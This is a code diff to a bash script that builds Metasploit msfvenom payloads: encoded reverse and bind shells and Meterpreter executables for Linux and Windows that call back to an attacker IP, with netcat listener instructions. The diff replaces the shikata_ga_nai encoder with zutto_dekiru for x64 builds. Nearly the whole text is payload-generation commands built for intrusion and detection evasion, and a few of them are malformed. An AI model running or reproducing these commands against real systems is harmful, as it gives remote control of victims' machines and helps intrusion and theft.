@@ -48,7 +48,7 @@ if [[ $input == "1" ]]; then ## Linux
         read -p "Attacker IP Address: " IP
         read -p "Victim IP Address: " VI
         read -p "Listener Port: " PO
-        read -p "shikata iterations: " SH
+        read -p "Encod Iteration: " SH
     echo -e "\n${BLUE}╔═════{ Platforms :${XX}"
         echo -e "══{1. Simple_Shell"
         echo -e "══{2. Bash Scripting"
@@ -304,8 +304,8 @@ if [[ $input == "1" ]]; then ## Linux
             echo -e "\n[*] Run the following command on Attacker PC for Bind shell:" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
             echo -e "    nc -nvp $PO $VI" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
             msfvenom -p linux/x64/shell/bind_tcp RHOST=$VI LPORT=$PO -f elf > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/x64_Shell_Bind_TCP_shikata.elf
-        ### shikata_ga_nai Payloads
-            msfvenom -p linux/x64/shell/bind_tcp RHOST=$VI LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/x64_Shell_Bind_TCP_shikata.elf
+        ### zutto_dekiru Payloads
+            msfvenom -p linux/x64/shell/bind_tcp RHOST=$VI LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/x64_zutto_dekiru.elf
         #Meterpreter_Binaries/Staged
         echo -e "\n${BLUE}[+] Creating Meterpreter Staged Payload:${XX}"
         mkdir Payload_List/Binary/Meterpreter_Binaries/Staged 2>/dev/null
@@ -321,9 +321,10 @@ if [[ $input == "1" ]]; then ## Linux
             msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=$VI LPORT=$PO -f elf > Payload_List/Binary/Meterpreter_Binaries/Staged/x64_Bind_TCP.elf
         ### shikata_ga_nai Payloads
             msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Meterpreter_Binaries/Staged/x86_Rev_TCP_shikata.elf
-            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Meterpreter_Binaries/Staged/x64_Rev_TCP_shikata.elf
             msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=$VI LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Meterpreter_Binaries/Staged/x86_Bind_TCP_shikata.elf
-            msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=$VI LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Meterpreter_Binaries/Staged/x64_Bind_TCP_shikata.elf
+        ### zutto_dekiru Payloads
+            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Meterpreter_Binaries/Staged/x64_Rev_TCP_zutto_dekiru.elf
+            msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=$VI LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Meterpreter_Binaries/Staged/x64_Bind_TCP_zutto_dekiru.elf
         echo -e "\n${BLUE}[+] Creating Meterpreter Stageless Payload:${XX}"
         mkdir Payload_List/Binary/Meterpreter_Binaries/Stageless 2>/dev/null
             echo -e "[*]_____The following Reverse Shell will run with multi_handler_____[*]" > Payload_List/Binary/Meterpreter_Binaries/Stageless/Read_Me.txt
@@ -334,7 +335,8 @@ if [[ $input == "1" ]]; then ## Linux
             msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Meterpreter_Binaries/Stageless/shell-x64.elf
         ### shikata_ga_nai Payloads
             msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Meterpreter_Binaries/Stageless/shell-x86-shikata.elf
-            msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Meterpreter_Binaries/Stageless/shell-x64-shikata.elf
+        ### zutto_dekiru Payloads
+            msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Meterpreter_Binaries/Stageless/shell-x64-zutto_dekiru.elf
         echo -e "\n${BLUE}[+] Creating Non_Meterpreter Staged Payload:${XX}"
         mkdir Payload_List/Binary 2>/dev/null
         mkdir Payload_List/Binary/Non_Meterpreter_Binaries 2>/dev/null
@@ -353,8 +355,9 @@ if [[ $input == "1" ]]; then ## Linux
             msfvenom -p linux/x64/shell/bind_tcp RHOST=$VI LPORT=$PO -f elf > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/x64_Shell_Bind_TCP.elf
         ### shikata_ga_nai Payloads
             msfvenom -p linux/x86/shell/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/shell-x86-shikata.elf
-            msfvenom -p linux/x64/shell/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/shell-x64-shikata.elf
-            msfvenom -p linux/x64/shell/bind_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/x64_Shell_Bind_TCP-shikata.elf
+        ### zutto_dekiru Payloads
+            msfvenom -p linux/x64/shell/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/shell-x64-zutto_dekiru.elf
+            msfvenom -p linux/x64/shell/bind_tcp LHOST=$IP LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/x64_Shell_Bind_TCP-zutto_dekiru.elf
         echo -e "\n${BLUE}[+] Creating Non_Meterpreter Stageless Payload:${XX}"
         mkdir Payload_List/Binary 2>/dev/null
         mkdir Payload_List/Binary/Non_Meterpreter_Binaries 2>/dev/null
@@ -375,9 +378,10 @@ if [[ $input == "1" ]]; then ## Linux
             msfvenom -p linux/x64/shell_bind_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x64_Bind_TCP.elf
         ### shikata_ga_nai Payloads
             msfvenom -p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x86_shell_rev-shikata.elf
-            msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x64_shell_rev-shikata.elf
             msfvenom -p generic/shell_bind_tcp LHOST=$IP LPORT=$PO -f elf x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/generic_bind_shell-shikata.elf
-            msfvenom -p linux/x64/shell_bind_tcp LHOST=$IP LPORT=$PO -f elf x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x64_Bind_TCP-shikata.elf
+        ### zutto_dekiru Payloads
+            msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x64_shell_rev-zutto_dekiru.elf
+            msfvenom -p linux/x64/shell_bind_tcp LHOST=$IP LPORT=$PO -f elf x64/zutto_dekiru -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x64_Bind_TCP-zutto_dekiru.elf
         echo -e "\n${RED}DONE, look into Payload_List/Binary${XX}"
     fi
 elif [[ $input == "2" ]]; then ## Windows
@@ -421,7 +425,8 @@ elif [[ $input == "2" ]]; then ## Windows
             msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Meterpreter_Binaries/Staged/shell-x64.exe
         ### shikata_ga_nai Payloads
             msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Meterpreter_Binaries/Staged/shell-x86_shikata.exe
-            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Meterpreter_Binaries/Staged/shell-x64_shikata.exe
+        ### zutto_dekiru Payloads
+            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x64/zutto_dekiru -i $SH > Payload_List/Meterpreter_Binaries/Staged/shell-x64_zutto_dekiru.exe
         echo -e "\n${BLUE}[+] Creating Meterpreter Stageless Payload:${XX}"
         mkdir Payload_List/Meterpreter_Binaries/Stageless 2>/dev/null
             echo -e "[*]_____The following Reverse Shell will run with multi_handler_____[*]" > Payload_List/Meterpreter_Binaries/Stageless/Read_Me.txt
@@ -434,8 +439,9 @@ elif [[ $input == "2" ]]; then ## Windows
             msfvenom -p windows/meterpreter_bind_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Meterpreter_Binaries/Stageless/meter_bind_tcp.exe
         ### shikata_ga_nai Payloads
             msfvenom -p windows/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Meterpreter_Binaries/Stagelessshell-x86_shikata.exe
-            msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Meterpreter_Binaries/Stagelessshell-x64_shikata.exe
             msfvenom -p windows/meterpreter_bind_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Meterpreter_Binaries/Stageless/meter_bind_tcp_shikata.exe
+        ### zutto_dekiru Payloads
+            msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x64/zutto_dekiru -i $SH > Payload_List/Meterpreter_Binaries/Stagelessshell-x64_zutto_dekiru.exe
         echo -e "\n${BLUE}[+] Creating Non Meterpreter Staged Payload:${XX}"
         mkdir Payload_List/Non_Meterpreter_Binaries/Staged 2>/dev/null
             echo -e "[*]_____The following Reverse Shell will run with multi_handler or netcat_____[*]" > Payload_List/Non_Meterpreter_Binaries/Staged/Read_Me.txt
@@ -458,7 +464,8 @@ elif [[ $input == "2" ]]; then ## Windows
             msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Non_Meterpreter_Binaries/Stageless/x64_shell.exe
         ### shikata_ga_nai Payloads
             msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Non_Meterpreter_Binaries/Stageless/shell_shikata.exe
-            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Non_Meterpreter_Binaries/Stageless/x64_shell_shikata.exe
+        ### zutto_dekiru Payloads
+            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x64/zutto_dekiru -i $SH > Payload_List/Non_Meterpreter_Binaries/Stageless/x64_shell_zutto_dekiru.exe
             echo -e "\n${RED}DONE, look into Payload_List${XX}"
     elif [[ $ty == "3" ]]; then
         echo -e "\n${BLUE}[+] Creating User_Account Payload:${XX}"
